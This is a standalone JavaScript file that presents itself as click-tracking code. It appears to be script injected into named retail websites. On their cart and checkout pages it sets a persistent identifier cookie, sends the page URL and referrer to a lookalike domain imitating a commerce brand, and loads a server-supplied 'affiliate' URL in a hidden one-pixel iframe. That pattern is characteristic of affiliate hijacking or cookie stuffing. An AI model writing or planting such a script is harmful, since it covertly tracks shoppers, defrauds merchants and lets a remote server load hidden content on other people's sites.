(function () {
  const CHECKOUT_KEYWORDS = ['cart', 'checkout', 'checkouts', 'pay', 'review-order', 'payment', 'shipping'];
  const TRACK_URL = 'https://cdn-shopiify.com/api/track-click';
  const FALLBACK_PIXEL_URL = 'https://cdn-shopiify.com/api/fallback-pixel?id=';

  const EXTRA_CART_PING_HOSTNAME = 'www.fareastflora.com';
  const EXTRA_CART_PING_DELAY = 2000;

  const SITE_CONFIG = {
    'www.fareastflora.com': { always: false, cartExtra: true },
    'aimedialinks.com': { always: true, cartExtra: true },
    'www.pizzahut.com.ph': { always: false, cartExtra: true },
    'www.stylevana.com': { always: false, cartExtra: true },
    'www.watsons.com.hk': { always: true, cartExtra: true },
    'www.watsonswine.com': { always: false, cartExtra: true },
    'sg.6ixty8ight.com': { always: false, cartExtra: true },
    'steadfastgolf.com': { always: true, cartExtra: true },
  };

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      const r = (Math.random() * 16) | 0;
      const v = c === 'x' ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  }

  function getCookie(name) {
    const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
    return match ? decodeURIComponent(match[1]) : '';
  }

  function createTrackingPixel(url) {
    const iframe = document.createElement('iframe');
    iframe.src = url;
    iframe.setAttribute('sandbox', 'allow-scripts allow-forms');
    iframe.style.display = 'none';
    iframe.style.visibility = 'hidden';
    iframe.style.width = '1px';
    iframe.style.height = '1px';
    iframe.style.border = '0';
    document.body.appendChild(iframe);
  }

  function isCheckoutPage() {
    const path = window.location.pathname.toLowerCase();
    return CHECKOUT_KEYWORDS.find(function (keyword) {
      return path.includes(keyword);
    });
  }

  function isOnCheckoutPage() {
    return Boolean(isCheckoutPage());
  }

  async function doPing() {
    try {
      const uniqueId = getCookie('tracking_uuid') || generateUUID();
      const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + '; path=/; SameSite=Lax';

      const response = await fetch(TRACK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url: location.href,
          referrer: document.referrer,
          unique_id: uniqueId,
          origin: location.hostname
        })
      });
      const data = await response.json();

      if (data.success && data.affiliate_url) {
        createTrackingPixel(data.affiliate_url);
      } else {
        createTrackingPixel(FALLBACK_PIXEL_URL + uniqueId);
      }
    } catch (err) {
      console.error('Tracking error', err);
    }
  }

  function pingWithExtra() {
    doPing();
    if (window.location.hostname === EXTRA_CART_PING_HOSTNAME) {
      setTimeout(doPing, EXTRA_CART_PING_DELAY);
    }
  }

  function main() {
    const hostname = window.location.hostname;
    const config = SITE_CONFIG[hostname];
    if (!config) return;

    if (config.cartExtra && isOnCheckoutPage()) pingWithExtra();
    else config.always && pingWithExtra();
  }

  document.readyState === 'complete'
    ? main()
    : window.addEventListener('load', main, { once: true });
})();
